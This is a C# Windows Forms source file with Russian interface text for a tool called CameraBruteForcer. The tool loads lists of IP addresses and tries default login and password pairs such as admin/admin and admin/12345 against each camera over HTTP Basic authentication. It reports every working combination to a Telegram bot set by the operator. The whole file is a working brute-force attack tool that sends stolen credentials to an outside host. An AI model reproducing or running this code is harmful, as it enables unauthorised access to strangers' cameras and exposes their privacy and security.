using System;
using System.IO;
using System.Net.Http;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace CameraBruteForcer
{
    public partial class CameraBruteForm : Form
    {
        private List<string> ipList = new List<string>();
        private List<string> logins = new List<string>() { "admin", "user" };
        private List<string> passwords = new List<string>() { "admin", "12345", "password" };
        private TelegramHelper telegram;
        private Logger logger;

        public CameraBruteForm()
        {
            InitializeComponent();
            logger = new Logger(listBoxLog);
        }

        private async void buttonTestBot_Click(object sender, EventArgs e)
        {
            telegram = new TelegramHelper(textBoxBotToken.Text, textBoxTelegramId.Text, logger);
            bool success = await telegram.SendMessageAsync("Тестовое сообщение от брутфорсера");
            logger.Add(success ? "Успешно отправлено!" : "Ошибка отправки!");
        }

        private void buttonLoadIp_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                ipList.Clear();
                foreach (var line in File.ReadAllLines(ofd.FileName))
                {
                    if (!string.IsNullOrWhiteSpace(line)) ipList.Add(line.Trim());
                }
                logger.Add($"Загружено {ipList.Count} IP");
            }
        }

        private async void buttonStart_Click(object sender, EventArgs e)
        {
            logins = new List<string>(textBoxLogins.Text.Split(','));
            passwords = new List<string>(textBoxPasswords.Text.Split(','));
            telegram = new TelegramHelper(textBoxBotToken.Text, textBoxTelegramId.Text, logger);

            logger.Add($"Начало перебора. IP: {ipList.Count}, Логины: {logins.Count}, Пароли: {passwords.Count}");

            foreach (var ip in ipList)
            {
                foreach (var login in logins)
                {
                    foreach (var pass in passwords)
                    {
                        bool ok = await CheckCamera(ip, login, pass);
                        logger.Add($"Проверка {ip} {login}:{pass} - " + (ok ? "Success" : "Fail"));
                        if (ok)
                        {
                            await telegram.SendMessageAsync($"Найдено!\n{ip}\n{login}:{pass}");
                            break;
                        }
                    }
                }
            }
            logger.Add("Брутфорс завершен!");
        }

        private async Task<bool> CheckCamera(string ip, string login, string pass)
        {
            string url = $"http://{ip}";
            using (var client = new HttpClient())
            {
                var byteArray = System.Text.Encoding.ASCII.GetBytes($"{login}:{pass}");
                client.DefaultRequestHeaders.Authorization =
                    new System.Net.Http.Headers.AuthenticationHeaderValue("Basic", Convert.ToBase64String(byteArray));
                try
                {
                    var response = await client.GetAsync(url);
                    return response.IsSuccessStatusCode;
                }
                catch
                {
                    return false;
                }
            }
        }
    }
}